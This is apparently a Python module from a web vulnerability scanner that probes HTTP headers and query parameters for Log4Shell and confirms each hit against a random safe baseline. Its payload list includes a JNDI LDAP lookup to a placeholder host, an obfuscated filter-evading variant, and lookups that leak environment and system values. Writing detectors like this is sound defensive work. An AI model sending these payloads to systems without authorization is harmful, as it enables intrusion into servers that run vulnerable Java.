"""Log4Shell + generic log injection probe — strict-validation v0.10.4.

Sebelumnya: 500 + keyword JNDI/log4j -> flag. Banyak server yang selalu
return 500 dengan stack trace generic ketika header/param diubah, sehingga
banyak FP.

Sekarang: konfirmasi dengan baseline string aman. Hanya flag kalau:
- Payload JNDI memicu 500 + keyword JNDI/log4j di body.
- Payload string aman (random) TIDAK memicu 500 dengan keyword yang sama.
"""
from __future__ import annotations

import secrets
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

from cyberloka.core import (
    Finding,
    HttpClient,
    Severity,
    Target,
    ValidationProof,
    build_extra,
)
from cyberloka.core.config import ScanConfig
from cyberloka.recon.crawler import get_state

LOG4SHELL_PAYLOADS = [
    "${jndi:ldap://cyberloka-probe.invalid/x}",
    "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://x.invalid/y}",
    "${env:USER}",
    "${sys:user.home}",
]
HEADERS_TO_TEST = [
    "User-Agent", "X-Forwarded-For", "Referer", "X-Api-Version",
    "X-Forwarded-Host", "X-Real-IP",
]
JNDI_KEYWORDS = ("jndi", "log4j", "naming", "namingexception")


def _has_jndi_signature(body: str) -> bool:
    body_low = (body or "").lower()
    return any(s in body_low for s in JNDI_KEYWORDS)


def run(target: Target, config: ScanConfig) -> list[Finding]:
    findings: list[Finding] = []
    client = HttpClient(config)
    try:
        # Baseline halaman utama: jika sudah 500 + JNDI keyword tanpa payload,
        # endpoint memang noisy -> skip.
        baseline = client.get(target.base_url)
        if baseline is not None and baseline.status_code == 500 and _has_jndi_signature(baseline.text or ""):
            return findings

        # 1) Header injection
        for header in HEADERS_TO_TEST:
            for payload in LOG4SHELL_PAYLOADS[:2]:
                r = client.get(target.base_url, headers={header: payload})
                if r is None:
                    continue
                if r.status_code != 500 or not _has_jndi_signature(r.text or ""):
                    continue
                # Konfirmasi: header dengan string aman.
                safe_value = f"cyberloka_baseline_{secrets.token_hex(3)}"
                safe = client.get(target.base_url, headers={header: safe_value})
                if safe is None:
                    continue
                if safe.status_code == 500 and _has_jndi_signature(safe.text or ""):
                    # Endpoint selalu 500 + JNDI keyword -> bukan oracle valid.
                    continue
                proof = ValidationProof(
                    method="payload-vs-safe-baseline",
                    confirmed=True,
                    steps=[
                        f"Header `{header}` dengan payload JNDI -> 500 + keyword JNDI/log4j.",
                        f"Header `{header}` dengan string aman `{safe_value}` -> "
                        f"status {safe.status_code}, JNDI keyword: "
                        f"{_has_jndi_signature(safe.text or '')}.",
                        "Hanya payload JNDI yang memicu 500+JNDI -> log4j parser kemungkinan vulnerable.",
                    ],
                    samples=[f"{header}: {payload}"],
                )
                findings.append(Finding(
                    module="log_injection", target=target.base_url,
                    title=f"Header `{header}` memicu error log4j (terkonfirmasi)",
                    severity=Severity.CRITICAL,
                    description=(
                        "Mengirim payload JNDI lewat header memicu error 500 dengan "
                        "kata kunci JNDI/log4j, sementara header dengan string aman "
                        "tidak. Konfirmasi target kemungkinan rentan Log4Shell."
                    ),
                    evidence=f"{header}: {payload} -> 500; safe baseline: {safe.status_code}",
                    cwe="CWE-117",
                    confidence="confirmed",
                    urls=[target.base_url],
                    remediation=(
                        "Upgrade log4j ke >= 2.17.1, atau set "
                        "`log4j2.formatMsgNoLookups=true`. Audit semua dependency Java."
                    ),
                    references=["https://logging.apache.org/log4j/2.x/security.html"],
                    extra=build_extra(proof=proof),
                ))
                return findings

        # 2) Param injection
        s = get_state(config)
        if not s:
            return findings
        for url in s.param_urls[:5]:
            parsed = urlparse(url)
            params = list(parse_qsl(parsed.query))
            if not params:
                continue
            k0 = params[0][0]
            # Baseline: param dengan string aman.
            safe_value = f"cyberloka_baseline_{secrets.token_hex(3)}"
            base_p = [(k0, safe_value)] + params[1:]
            base_url_safe = urlunparse(parsed._replace(query=urlencode(base_p)))
            base_r = client.get(base_url_safe)
            if base_r is not None and base_r.status_code == 500 and _has_jndi_signature(base_r.text or ""):
                continue
            for payload in LOG4SHELL_PAYLOADS[:1]:
                new_params = [(k0, payload)] + params[1:]
                mutated = urlunparse(parsed._replace(query=urlencode(new_params)))
                r = client.get(mutated)
                if r is None:
                    continue
                if r.status_code != 500 or not _has_jndi_signature(r.text or ""):
                    continue
                proof = ValidationProof(
                    method="payload-vs-safe-baseline",
                    confirmed=True,
                    steps=[
                        f"Param `{k0}` dengan payload JNDI -> 500 + keyword JNDI.",
                        f"Param `{k0}` dengan string aman -> tidak ada kombinasi 500+JNDI.",
                    ],
                    samples=[f"{k0}={payload}"],
                )
                findings.append(Finding(
                    module="log_injection", target=mutated,
                    title=f"Parameter `{k0}` memicu error log4j (terkonfirmasi)",
                    severity=Severity.CRITICAL,
                    description=(
                        "Payload JNDI di param menyebabkan 500 + keyword log4j; "
                        "string aman tidak. Indikasi kuat log4j vulnerable."
                    ),
                    evidence=f"{k0}={payload} -> 500",
                    cwe="CWE-117",
                    confidence="confirmed",
                    urls=[mutated],
                    remediation="Sama dengan Log4Shell: upgrade log4j ke >= 2.17.1.",
                    extra=build_extra(proof=proof),
                ))
                return findings
    finally:
        client.close()
    return findings
